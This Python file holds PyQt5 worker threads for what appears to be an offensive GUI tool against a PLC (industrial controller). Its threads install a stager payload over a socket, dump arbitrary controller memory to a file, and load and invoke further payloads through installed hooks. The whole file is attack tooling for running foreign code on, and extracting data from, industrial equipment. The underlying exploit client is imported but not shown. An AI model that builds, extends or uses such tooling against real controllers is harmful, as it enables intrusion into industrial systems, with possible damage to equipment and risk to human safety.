from PyQt5.QtCore import QThread, pyqtSignal
import os
import client

class PLCConnectionThread(QThread):
    connection_succeeded = pyqtSignal(str, str)
    connection_failed = pyqtSignal(str)
    def __init__(self, host, port, stager_payload_path, parent_gui):
        super().__init__(parent_gui)
        self.host = host
        self.port = port
        self.stager_payload_path = stager_payload_path
        self.parent_gui = parent_gui
    def run(self):
        try:
            self.parent_gui.client_instance = client.PLCInterface(self.host, self.port)
            if not self.parent_gui.client_instance.connect():
                self.connection_failed.emit(f"Socket connection failed to {self.host}:{self.port}.")
                return
            self.parent_gui._log(f"Thread: Socket connected to {self.host}:{self.port}. Attempting handshake...")
            success, greeting = self.parent_gui.client_instance.perform_handshake()
            if not success:
                self.parent_gui.client_instance.disconnect()
                self.parent_gui.client_instance = None
                self.connection_failed.emit(f"Handshake failed: {greeting}")
                return
            greeting_hex = greeting.hex() if greeting else "N/A"
            version_str = self.parent_gui.client_instance.get_plc_version()
            if not os.path.exists(self.stager_payload_path):
                self.parent_gui.client_instance.disconnect()
                self.parent_gui.client_instance = None
                self.connection_failed.emit(f"Stager payload {self.stager_payload_path} not found!")
                return
            with open(self.stager_payload_path, "rb") as f:
                stager_code = f.read()
            self.parent_gui._log(f"Thread: Installing stager ({len(stager_code)} bytes)...")
            self.parent_gui.client_instance.install_stager_payload(stager_code)
            self.connection_succeeded.emit(version_str, greeting_hex)
        except FileNotFoundError as fnf_err:
            self.connection_failed.emit(str(fnf_err))
            if self.parent_gui.client_instance:
                self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None
        except Exception as e:
            self.connection_failed.emit(f"An unexpected error occurred in connection thread: {e}")
            if self.parent_gui.client_instance:
                self.parent_gui.client_instance.disconnect()
            self.parent_gui.client_instance = None

class MemoryDumpThread(QThread):
    dump_progress = pyqtSignal(int, int, float, float, float)
    dump_succeeded = pyqtSignal(str, int)
    dump_failed = pyqtSignal(str)
    def __init__(self, client_instance, dump_payload_path, dump_address, num_bytes, output_file_path, parent_gui):
        super().__init__(parent_gui)
        self.client_instance = client_instance
        self.dump_payload_path = dump_payload_path
        self.dump_address = dump_address
        self.num_bytes = num_bytes
        self.output_file_path = output_file_path
        self.parent_gui = parent_gui
    def run(self):
        original_callback = None
        try:
            self.parent_gui._log(f"Dump Thread: Loading dump payload from {self.dump_payload_path}")
            with open(self.dump_payload_path, "rb") as f:
                dump_payload_code = f.read()
            self.parent_gui._log("Dump Thread: Executing memory dump operation...")
            original_callback = self.client_instance.progress_callback
            self.client_instance.progress_callback = self.dump_progress.emit
            dumped_data = self.client_instance.execute_memory_dump(
                dump_payload_code,
                self.dump_address,
                self.num_bytes
            )
            self.client_instance.progress_callback = original_callback
            original_callback = None
            self.parent_gui._log(f"Dump Thread: Saving {len(dumped_data)} bytes to {self.output_file_path}")
            with open(self.output_file_path, "wb") as f:
                f.write(dumped_data)
            self.dump_succeeded.emit(self.output_file_path, len(dumped_data))
        except FileNotFoundError as fnf_err:
            self.dump_failed.emit(f"Dump payload file not found: {fnf_err}")
        except Exception as e:
            self.parent_gui._log(f"Dump Thread: Exception: {e}")
            self.dump_failed.emit(f"An error occurred during memory dump: {e}")
        finally:
            if original_callback is not None and hasattr(self.client_instance, 'progress_callback'):
                self.client_instance.progress_callback = original_callback

class ExecutePayloadThread(QThread):
    payload_execution_succeeded = pyqtSignal(str, object)
    payload_execution_failed = pyqtSignal(str)
    def __init__(self, client_instance, payload_path, payload_args_str, parent_gui):
        super().__init__(parent_gui)
        self.client_instance = client_instance
        self.payload_path = payload_path
        self.payload_args_str = payload_args_str
        self.parent_gui = parent_gui
    def run(self):
        try:
            self.parent_gui._log(f"Payload Thread: Loading payload from {self.payload_path}")
            with open(self.payload_path, "rb") as f:
                payload_code = f.read()
            payload_args_bytes = self.payload_args_str.encode('utf-8')
            self.parent_gui._log(f"Payload Thread: Installing payload ({len(payload_code)} bytes) with args '{self.payload_args_str}'...")
            hook_idx = self.client_instance.install_payload_via_stager(payload_code)
            self.parent_gui._log(f"Payload Thread: Invoking payload hook 0x{hook_idx:02x}...")
            response = self.client_instance.invoke_add_hook(hook_idx, payload_args_bytes)
            self.payload_execution_succeeded.emit(f"0x{hook_idx:02x}", response)
        except FileNotFoundError:
            self.payload_execution_failed.emit(f"Payload file not found: {self.payload_path}")
        except Exception as e:
            self.parent_gui._log(f"Payload Thread: Exception: {e}")
            self.payload_execution_failed.emit(f"An error occurred during payload execution: {e}")
